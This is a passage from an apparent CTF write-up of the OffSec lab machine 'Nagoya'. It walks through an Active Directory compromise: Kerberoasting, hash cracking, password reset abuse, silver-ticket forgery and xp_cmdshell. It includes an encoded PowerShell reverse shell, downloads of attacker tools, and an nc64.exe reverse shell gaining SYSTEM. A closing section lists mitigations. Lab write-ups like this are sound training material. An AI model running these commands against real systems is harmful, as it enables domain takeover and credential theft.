OriginalFilename
ResetPassword.exe
ProductName
ResetPassword
ProductVersion
1.0.0.0
Assembly Version
1.0.0.0
```

Time to test new credential which gives more access to the SMB shares and tested the WinRM access using this new credential but didn’t work.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya/port445smb]
└─$ crackmapexec smb 192.168.204.21 -u 'svc_helpdesk' -p 'U299iYRmikYTHDbPbxPoYYfa2j4x4cdg' --shares
SMB         192.168.204.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.204.21  445    NAGOYA           [+] nagoya-industries.com\svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg 
SMB         192.168.204.21  445    NAGOYA           [+] Enumerated shares
SMB         192.168.204.21  445    NAGOYA           Share           Permissions     Remark
SMB         192.168.204.21  445    NAGOYA           -----           -----------     ------
SMB         192.168.204.21  445    NAGOYA           ADMIN$                          Remote Admin
SMB         192.168.204.21  445    NAGOYA           C$                              Default share
SMB         192.168.204.21  445    NAGOYA           IPC$            READ            Remote IPC
SMB         192.168.204.21  445    NAGOYA           NETLOGON        READ            Logon server share 
SMB         192.168.204.21  445    NAGOYA           SYSVOL          READ            Logon server share 
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya/port445smb]
└─$ crackmapexec winrm 192.168.204.21 -u 'svc_helpdesk' -p 'U299iYRmikYTHDbPbxPoYYfa2j4x4cdg'     
SMB         192.168.204.21  5985   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
HTTP        192.168.204.21  5985   NAGOYA           [*] http://192.168.204.21:5985/wsman
WINRM       192.168.204.21  5985   NAGOYA           [-] nagoya-industries.com\svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

Ran the `bloodhound-python` for Active Directory enumeration. Extracted data put into the `Bloodhoud` and generate report through `Plumhound` for easy to read data.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ bloodhound-python -d 'nagoya-industries.com' -u 'svc_helpdesk' -p 'U299iYRmikYTHDbPbxPoYYfa2j4x4cdg' -c all -ns 192.168.204.21 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: nagoya-industries.com
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (nagoya.nagoya-industries.com:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: nagoya.nagoya-industries.com
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: nagoya.nagoya-industries.com
INFO: Found 36 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 4 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: nagoya.nagoya-industries.com
INFO: Done in 00M 02S
INFO: Compressing output into 20251203153905_bloodhound.zip
```

In the Plumhound’s reports.html > Kerberoastable Users gives information about the `MSSQL`.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image4.png)

Try the Kerberoasting using `svc_helpdesk` credential and got a `MSSQL` user’s hash. Cracked the hash using `hashcat` tool.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ impacket-GetUserSPNs -request -dc-ip 192.168.204.21 nagoya-industries.com/svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg -outputfile "kerberoast_hash.txt"
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                Name          MemberOf                                          PasswordLastSet             LastLogon                   Delegation 
----------------------------------  ------------  ------------------------------------------------  --------------------------  --------------------------  ----------
http/nagoya.nagoya-industries.com   svc_helpdesk  CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com  2023-04-30 03:31:06.190955  <never>                                
MSSQL/nagoya.nagoya-industries.com  svc_mssql                                                       2023-04-30 03:45:33.288595  2024-08-01 22:59:53.706593             

[-] CCache file is not found. Skipping...
```

```
C:\...\...\tools\hashcat-7.1.2>hashcat.exe -m 13100 ..\hashes.txt ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt --force
hashcat (v7.1.2) starting
...
...
...
Dictionary cache hit:
* Filename..: ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*$adee74fb213c408ef2f0ef4406cf07c5$a6996e61c11d3f196fa304b0ebf67fecf2590416f0e880b9c936ea7892b2a7a60c8c5af0ab5f0041c709ea80ed0825e3adbb83344a205cc729aee8811d7ecef8331273f9d6e6b44961dc10463221c428843e9444b773f8449ae9ad6f7f1be2a4d8fd0059bbe83eed6144aea78ab31fda74b4e3c50fdbd814ab1d6d1b0448812ba31cba9268a6af0334af4d56fa0e9129ac06096ede6f9eae920a0422c51be5138a857c87bbad2beb16f00bdc7614fbdd8391ef31d082c2d9662a897aa5b86009c43d1f60100e2821a4bd20f2989fcdba3b1fd1f30ecadfae75bd76e9bc136d067c02ab61b0c04aa2778c412e365f4b381d41bb8120b9853621ef185a4e1215df05a30f3443b0ad57e74496760555c4a72932a2623c68b311d6aa804442385352c7f8da91aaed3859e47f797fe186912810aca56ca452ee86b757974ca0f23b74a12e34b802cc7f10568394eec8a91ccad28302119409891e124b349578401e45dab2244bfa6c7f88ff1215aea18d488a820a1b542efa899ca4ba9c0a873c5c92041851cf20ff1f1483a1e946713069c0bbaa2f0a120f81c47c8babd96ec796c5cc09cb78cf9bf03f426c6b43dbb19dbd7589384ad7e12b5f7e38faf8f89680b04bbab85c7cd36c62003452a1743160ac0b10330a31c8184224dfce27e218c58a78068bed37b436d7a9df87f3e756fe5fe1a3ed407aae13b34318999cf199971d1c3ed04a2820ed5b39e8aa81c46b03472853b21a8688277bf8d7222c149cedfd02f4542e7f008584667a1f29b522a9def4cc9646263c6d95eba67a90d24add7f8d91ca51373fc0da4b55ad003f6f6f16056c77223963b4212a31926357deba5a7f66f3d160115e82fd9e399bdbeaf6d7ea54096948f956605b218a55c72a5f5639c767ca7b9db72ee9a734064d324d1ff1a81d26c2251fba1ab93d517db426a57d059e0274a74084804c5ba5af73007a8719921fdae144e556adcea4dd44416106d3ad3961f0fd70251a4b8a78877fd89e5908d950be5a007a6ff497305bb8d3eb92418e93f61c376f3f669d7f95fa0d6a2cdc82bd5a9c1b878106aa9859991e5cf10df4c0a929ef387d80542ac46b504f1300f2d57b4debcf5457ce81ff5af8249882a09675a9abd9b973e1e7b0f6636da60d8e9ce58788e6c60103c60b5ea23a066d1b5e451d75d62875f41b69400949a5dbbcbb5589caf13db8e56992bad9b96a0ebce180f2d20b8905d2351eb3a1e7cb9888788f9385c885f838abdc020b94cf3c23752354ae5414f69d201fb4bd63962466d95a73f64ea79a621a78833366162ecce0429f0441071a07b82cd755da4e93a8c4ec62555498c89f305a2a90313fa060b47b3729f4544de2d20ef7f4353229457e297c2a621d91245b602da8207b5f41ac3466281ebe662ab70e90d22f16340b744829c5458d994d08f15f25feeeef55c46db4d2c2a2340c5d7a1b0c218314f3268a17219fe1e2c85b2de1fcb675092822c9d54461014e73e8ccee34f9188390ca04483cfe02f9f5c1f5a98d0fc8b99f3dafc928b823da31ffd8aa92547c28ddb58762d41185fe6fc556a9ad5bc348ec00973e1e62d8933f1fa799204198b609bf0adf32d0d54c7e579021416f9aad49b9243b4ba848:Service1
Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: ..\hashes.txt
Time.Started.....: Wed Dec 03 21:29:15 2025, (2 secs)
Time.Estimated...: Wed Dec 03 21:29:17 2025, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  9353.7 kH/s (5.27ms) @ Accel:960 Loops:1 Thr:32 Vec:1
Speed.#03........:   608.8 kH/s (11.98ms) @ Accel:53 Loops:1 Thr:32 Vec:1
Speed.#*.........:  9962.6 kH/s
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 28688768/28688768 (100.00%)
Rejected.........: 0/28688768 (0.00%)
Restore.Point....: 14240576/14344384 (99.28%)
Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:0-1
Restore.Sub.#03..: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 0107025431 -> $HEX[042a0337c2a156616d6f732103]
Candidates.#03...: 0122463161 -> 010702604
Hardware.Mon.#01.: Temp: 48c Util: 45% Core:1972MHz Mem:7001MHz Bus:8
Hardware.Mon.#03.: N/A

Started: Wed Dec 03 21:28:54 2025
Stopped: Wed Dec 03 21:29:17 2025
```

svc_mssql user is not useful even if we get and password at this moment. When I move further into the box. It might be useful later. In the `Bloodhound` tool during the enumeration, found a different attack vector. The `svc_helpdesk` user can reset a password of the `christopher.lewis` user. This user is the member to the `Remote Management Users` group which has a access of RDP service.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image5.png)

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image6.png)

Reset a password given in Bloodhound tool and try to login with new changed credential to the `christopher.lewis` user. 

## Initial Foothold

There are two way we can change the password through `net` tool and `rpcclient` tool.

- net tool for reset password of the `christopher.lewis` user.
    
    ```
    ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
    └─$ net rpc password "christopher.lewis" "newP@ssword2022" -U "nagoya-industries.com"/"svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "192.168.204.21"
    ```
    
- Intended way to reset password of the `christopher.lewis` user.
    
    ```
    ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
    └─$ rpcclient -U nagoya-industries/svc_helpdesk 192.168.163.21
    Password for [NAGOYA-INDUSTRIES\svc_helpdesk]:
    rpcclient $> setuserinfo2 Christopher.Lewis 23 Start123!
    rpcclient $> exit
                                                                                                                                                                                
    ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
    └─$ evil-winrm-py -i 192.168.163.21 -u 'Christopher.Lewis' -p 'Start123!'      
              _ _            _                             
      _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
     / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
     \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                                |_|   |__/  v1.5.0
    
    [*] Connecting to '192.168.163.21:5985' as 'Christopher.Lewis'
    evil-winrm-py PS C:\Users\Christopher.Lewis\Documents> whoami
    nagoya-ind\christopher.lewis
    ```
    

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ evil-winrm-py -i 192.168.204.21 -u 'christopher.lewis' -p 'newP@ssword2022'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '192.168.204.21:5985' as 'christopher.lewis'
evil-winrm-py PS C:\Users\Christopher.Lewis\Documents> whoami
nagoya-ind\christopher.lewis
evil-winrm-py PS C:\Users\Christopher.Lewis\Documents> cd \
evil-winrm-py PS C:\> dir

    Directory: C:\

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----        4/30/2023   2:07 AM                inetpub                                                                
d-----        4/29/2023   5:38 AM                PerfLogs                                                               
d-r---        4/30/2023   1:39 AM                Program Files                                                          
d-----        4/30/2023   1:39 AM                Program Files (x86)                                                    
d-----        4/29/2023  11:41 PM                SQL2022                                                                
d-----        4/30/2023  12:37 AM                Temp                                                                   
d-r---        12/3/2025   2:13 PM                Users                                                                  
d-----        4/30/2023  12:36 AM                Windows                                                                
-a----        12/3/2025   2:08 PM             34 local.txt                                                              
-a----        12/3/2025   2:08 PM            866 output.txt                                                             

evil-winrm-py PS C:\> type local.txt
ebc355b4f980c7851f9fe30fc7110624
```

## Privilege Escalation

While enumeration localhost network found a interesting port `1433`

```
evil-winrm-py PS C:\> netstat -ano | findstr "1433"
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3612
  TCP    [::]:1433              [::]:0                 LISTENING       3612
```

In order to connect MSSQL database as a `svc_mssql` user, we need to generate silver ticket and using port forwarding to connect to the MSSQL server locally.

Generate silver ticket requirements.

- Generate a password NT hash using `Cyberchef` tool.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image7.png)

`E3A0168BC21CFB88B95C954A5B18F57C`

- Extract the SID, SPN and Domain Name using `PowerView.ps1` script.

```
evil-winrm-py PS C:\Users\Christopher.Lewis\Downloads> . .\PowerView.ps1
evil-winrm-py PS C:\Users\Christopher.Lewis\Downloads> Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames

DistinguishedName     : CN=svc_mssql,CN=Users,DC=nagoya-industries,DC=com
Enabled               : True
GivenName             : svc_mssql
Name                  : svc_mssql
ObjectClass           : user
ObjectGUID            : df7dda21-173f-4a4a-88ed-70d69481b46e
SamAccountName        : svc_mssql
ServicePrincipalNames : {MSSQL/nagoya.nagoya-industries.com}
SID                   : S-1-5-21-1969309164-1513403977-1686805993-1136
Surname               : 
UserPrincipalName     : svc_mssql@nagoya-industries.com
```

Now we got everything for Silver ticket to generate using `impacket-ticket` module.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ impacket-ticketer -nthash 'E3A0168BC21CFB88B95C954A5B18F57C' -domain-sid 'S-1-5-21-1969309164-1513403977-1686805993-1136' -domain 'nagoya-industries.com' -spn 'MSSQL/nagoya.nagoya-industries.com' 'Administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for nagoya-industries.com/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Export ticket into the kali system.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ ls -l Administrator.ccache
-rw-rw-r-- 1 kali kali 1334 Dec  4 10:50 Administrator.ccache

┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ export KRB5CCNAME=$PWD/Administrator.ccache           
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ klist                                                 
Ticket cache: FILE:/home/kali/offsec/Practice/Nagoya/Administrator.ccache
Default principal: Administrator@NAGOYA-INDUSTRIES.COM

Valid starting       Expires              Service principal
12/04/2025 10:50:12  12/02/2035 10:50:12  MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM
	renew until 12/02/2035 10:50:12
```

- Intended way use this configuration into the attacking machine (Kali Linux) but without this configuration my silver ticket did work.
    
    File location: `/etc/krb5user.conf`
    
    ```
    [libdefaults]
    	default_realm = NAGOYA-INDUSTRIES.COM
    	kdc_timesync = 1
    	ccache_type = 4
    	forwardable = true
    	proxiable = true
        rdns = false
        dns_canonicalize_hostname = false
    	fcc-mit-ticketflags = true
    
    [realms]	
    	NAGOYA-INDUSTRIES.COM = {
    		kdc = nagoya.nagoya-industries.com
    	}
    
    [domain_realm]
    	.nagoya-industries.com = NAGOYA-INDUSTRIES.COM
    ```
    

Our silver ticket is ready to use but need to setup port forwarding tunnel using `ligolo` tool. Here is IP changed from `192.168.204.21` to `192.168.163.21` because of I reset the machine and got the new IP. So, I changed the IP in my `/etc/hosts` file as well.

```
---Terminal 1---
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ evil-winrm-py -i 192.168.163.21 -u 'Christopher.Lewis' -p 'newP@ssword2022'                                                                            
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '192.168.163.21:5985' as 'Christopher.Lewis'
evil-winrm-py PS C:\Users\Christopher.Lewis\Documents> iwr -uri http://192.168.45.170/ligoloagent.exe -OutFile ligoloagent.exe
evil-winrm-py PS C:\Users\Christopher.Lewis\Documents> .\ligoloagent.exe -connect 192.168.45.170:11601 -ignore-cert
...
...
...

---Terminal 2---
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ ~/tools/ligolo/proxy/proxy --selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng » INFO[0012] Agent joined.                                 id=0050569e29da name="NAGOYA-IND\\Christopher.Lewis@nagoya" remote="192.168.163.21:49817"
ligolo-ng » session
? Specify a session : 1 - NAGOYA-IND\Christopher.Lewis@nagoya - 192.168.163.21:49817 - 0050569e29da
[Agent : NAGOYA-IND\Christopher.Lewis@nagoya] » start
INFO[0023] Starting tunnel to NAGOYA-IND\Christopher.Lewis@nagoya (0050569e29da)

---Terminal 3---
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ sudo ip route add 240.0.0.1/32 dev ligolo

┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ tail -n 3 /etc/hosts
192.168.163.21	nagoya-industries.com
240.0.0.1	nagoya.nagoya-industries.com
```

Once the port forwarding setup then try to login through `impacket-mssqlclient` tool. Tried to execute the system command through MSSQL service and it worked.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ impacket-mssqlclient -k 'nagoya.nagoya-industries.com'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (NAGOYA-IND\Administrator  dbo@master)> enable_xp_cmdshell
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami
output                 
--------------------   
nagoya-ind\svc_mssql   
NULL
```

Time to get a reverse shell as a `mssql` user.

```
---Terminal 1---
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAwACIALAA1ADAANQAwADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
...
...
...

---Terminal 2---
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ rlwrap nc -lnvp 50505
listening on [any] 50505 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.163.21] 49928

PS C:\Windows\system32> whoami
nagoya-ind\svc_mssql
```

Checked the `whoami /priv` and found a `SeImpersonatePrivilege` permission enabled. So, tried the `SigmaPotato` attack and got an `Administrator` shell using `nc64.exe` tool.

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

PS C:\Windows\system32> cd \Users\Public
PS C:\Users\Public> dir

    Directory: C:\Users\Public

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        4/29/2023  12:08 PM                Documents                                                             
d-r---        9/15/2018  12:19 AM                Downloads                                                             
d-r---        9/15/2018  12:19 AM                Music                                                                 
d-r---        9/15/2018  12:19 AM                Pictures                                                              
d-r---        9/15/2018  12:19 AM                Videos                                                                

PS C:\Users\Public> iwr -uri http://192.168.45.170/SigmaPotato.exe -OutFile SigmaPotato.exe
PS C:\Users\Public> iwr -uri http://192.168.45.170/nc64.exe -OutFile nc64.exe
PS C:\Users\Public> dir

    Directory: C:\Users\Public

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        4/29/2023  12:08 PM                Documents                                                             
d-r---        9/15/2018  12:19 AM                Downloads                                                             
d-r---        9/15/2018  12:19 AM                Music                                                                 
d-r---        9/15/2018  12:19 AM                Pictures                                                              
d-r---        9/15/2018  12:19 AM                Videos                                                                
-a----        12/4/2025   8:47 AM          45272 nc64.exe                                                              
-a----        12/4/2025   8:47 AM          63488 SigmaPotato.exe
```

```
---Terminal 1---
PS C:\Users\Public> .\SigmaPotato.exe "\Users\Public\nc64.exe 192.168.45.170 50505 -e powershell"
...
...
...

---Terminal 2---
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ rlwrap nc -lnvp 50505 
listening on [any] 50505 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.163.21] 50099
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Public> whoami
whoami
nt authority\system
PS C:\Users\Public> type \Users\Administrator\Desktop\proof.txt
type \Users\Administrator\Desktop\proof.txt
946755fca9345fa947ba2d2f4b04f58e
```

Without the Administrator shell the `proof.txt` flag can be extract the MSSQL service which is mentioned below.

- Intended way of get a Administrator flag
    
    ```
    ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
    └─$ impacket-mssqlclient -k 'nagoya.nagoya-industries.com'
    Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
    
    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
    [*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
    [!] Press help for extra shell commands
    SQL (NAGOYA-IND\Administrator  dbo@master)> select system_user;
                               
    ------------------------   
    NAGOYA-IND\Administrator   
    SQL (NAGOYA-IND\Administrator  dbo@master)> SELECT * FROM OPENROWSET (BULK 'c:usersadministratordesktopproof.txt', SINGLE_CLOB) as correlation_name;
    ERROR(nagoya\SQLEXPRESS): Line 1: Cannot bulk load. The file "c:usersadministratordesktopproof.txt" does not exist or you don't have file access rights.
    SQL (NAGOYA-IND\Administrator  dbo@master)> SELECT * FROM OPENROWSET (BULK 'c:\users\administrator\desktop\proof.txt', SINGLE_CLOB) as correlation_name;
    BulkColumn                                
    ---------------------------------------   
    b'946755fca9345fa947ba2d2f4b04f58e\r\n'   
    SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami
    output                 
    --------------------   
    nagoya-ind\svc_mssql
    ```
    

## Mitigation

- Enforce strong password policies and prevent seasonal or predictable passwords
- Disable anonymous LDAP binds
- Restrict access to SYSVOL scripts and remove sensitive data from executables
- Rotate service account passwords regularly
- Use Group Managed Service Accounts (gMSA)
- Monitor and alert on Kerberos ticket requests
- Apply least privilege to service accounts

## Conclusion

Nagoya is an excellent Active Directory practice machine that reinforces the importance of enumeration, patience, and chaining multiple small misconfigurations.

Key takeaways:

- Public-facing information can directly lead to domain compromise
- Weak passwords remain one of the most common attack vectors
- SYSVOL misconfigurations are extremely dangerous
- BloodHound is essential for understanding AD attack paths

This challenge closely mirrors real-world Active Directory attacks and provides valuable hands-on experience for penetration testers and red teamers.